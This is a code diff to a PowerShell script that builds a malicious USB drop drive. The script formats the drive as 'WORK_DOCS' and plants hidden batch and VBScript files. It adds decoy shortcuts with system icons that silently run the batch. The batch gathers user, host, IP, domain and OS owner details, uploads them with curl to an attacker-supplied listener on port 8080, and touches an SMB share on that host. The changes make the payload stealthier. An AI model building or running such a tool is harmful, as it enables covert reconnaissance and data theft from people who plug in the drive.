@@ -14,11 +14,6 @@ if (-not $listenerIP -or $listenerIP -in @('-h', '--help')) {
 }
 
 $removableDisks = Get-PhysicalDisk | Where-Object { $_.BusType -eq 'USB' }
-if ($removableDisks.Count -eq 0) {
-    Write-Host "`n[-] No USB drives detected." -ForegroundColor Red
-    exit 1
-}
-
 $driveList = @()
 foreach ($disk in $removableDisks) {
     $diskNumber = $disk.FriendlyName
@@ -43,39 +38,56 @@ for ($i = 0; $i -lt $driveList.Count; $i++) {
 }
 
 $choice = Read-Host "`nEnter number of drive to use"
-if (-not $choice -or ($choice -notmatch '^\d+$') -or ($choice -ge $driveList.Count)) {
+if ($choice -notmatch '^[0-9]+$' -or [int]$choice -ge $driveList.Count) {
     Write-Host "`n[-] Invalid selection. Aborting." -ForegroundColor Yellow
     exit 1
 }
 
-$drive = $driveList[$choice].DriveLetter + ":\"
-Format-Volume -DriveLetter $driveList[$choice].DriveLetter -FileSystem FAT32 -NewFileSystemLabel "WORK_DOCS" -Force -Confirm:$false
+$selectedDrive = $driveList[$choice]
+$driveLetter = $selectedDrive.DriveLetter
+$drive = "${driveLetter}:\"
+Format-Volume -DriveLetter $driveLetter -FileSystem FAT32 -NewFileSystemLabel "WORK_DOCS" -Force -Confirm:$false
 
 $dropPath = $drive
 $originalLocation = Get-Location
 Set-Location $dropPath
 
-$batTemplate = @"
-@echo off
-set TEMPFILE=%TEMP%\sysinfo.txt
+$batTemplate = @()
+$batTemplate += '@echo off'
+$batTemplate += 'set TEMPFILE=%TEMP%\sysinfo.txt'
+$batTemplate += 'echo === SYSTEM INFO DUMP === > %TEMPFILE%'
+$batTemplate += 'echo [WHOAMI] >> %TEMPFILE%'
+$batTemplate += 'whoami >> %TEMPFILE%'
+$batTemplate += 'echo. >> %TEMPFILE%'
+$batTemplate += 'echo [HOSTNAME] >> %TEMPFILE%'
+$batTemplate += 'hostname >> %TEMPFILE%'
+$batTemplate += 'echo. >> %TEMPFILE%'
+$batTemplate += 'echo [INTERNAL_IP] >> %TEMPFILE%'
+$batTemplate += 'ipconfig | findstr /i "IPv4" >> %TEMPFILE%'
+$batTemplate += 'echo. >> %TEMPFILE%'
+$batTemplate += 'echo [DOMAIN] >> %TEMPFILE%'
+$batTemplate += 'echo %USERDOMAIN% >> %TEMPFILE%'
+$batTemplate += 'echo. >> %TEMPFILE%'
+$batTemplate += 'echo [OS INFO] >> %TEMPFILE%'
+$batTemplate += 'systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"Registered Owner" /C:"Registered Organization" >> %TEMPFILE%'
+$batTemplate += 'echo. >> %TEMPFILE%'
+$batTemplate += 'curl -X POST -F "data=@%TEMPFILE%" http://' + $listenerIP + ':8080'
+$batTemplate += 'net use \\' + $listenerIP + '\share >nul 2>&1'
+$batTemplate += 'timeout /t 5 >nul'
+$batTemplate += 'del %TEMPFILE%'
 
-echo [WHOAMI] >> %TEMPFILE%
-whoami >> %TEMPFILE%
-echo [HOSTNAME] >> %TEMPFILE%
-hostname >> %TEMPFILE%
-echo [INTERNAL_IP] >> %TEMPFILE%
-ipconfig | findstr /i "IPv4" >> %TEMPFILE%
-echo [EXTERNAL_IP] >> %TEMPFILE%
-curl -s https://ifconfig.me >> %TEMPFILE%
-
-curl -X POST -F "data=@%TEMPFILE%" http://__IP__:8080
-del %TEMPFILE%
-"@
-
-$batContent = $batTemplate -replace "__IP__", $listenerIP
-$batPath = Join-Path $dropPath "update.bat"
-$batContent | Out-File -Encoding ASCII -FilePath $batPath
+$batPath = Join-Path $dropPath "_index.bat"
+$batTemplate | Set-Content -Encoding ASCII -Path $batPath
 attrib +h $batPath
+
+$vbsContent = @'
+Set WshShell = CreateObject("WScript.Shell")
+WshShell.Run chr(34) & "_index.bat" & chr(34), 0
+Set WshShell = Nothing
+'@
+$vbsPath = Join-Path $dropPath "_index.vbs"
+$vbsContent | Set-Content -Path $vbsPath -Encoding ASCII
+attrib +h $vbsPath
 
 function New-FakeLink {
     param (
@@ -85,9 +97,9 @@ function New-FakeLink {
     $shortcut = "$dropPath\$name.lnk"
     $WScriptShell = New-Object -ComObject WScript.Shell
     $lnk = $WScriptShell.CreateShortcut($shortcut)
-    $lnk.TargetPath = "cmd.exe"
-    $lnk.Arguments = "/c update.bat"
-    $lnk.IconLocation = "C:\Windows\System32\SHELL32.dll,$iconIndex"
+    $lnk.TargetPath = "wscript.exe"
+    $lnk.Arguments = "_index.vbs"
+    $lnk.IconLocation = "C:\\Windows\\System32\\SHELL32.dll,$iconIndex"
     $lnk.WindowStyle = 7
     $lnk.Save()
 }
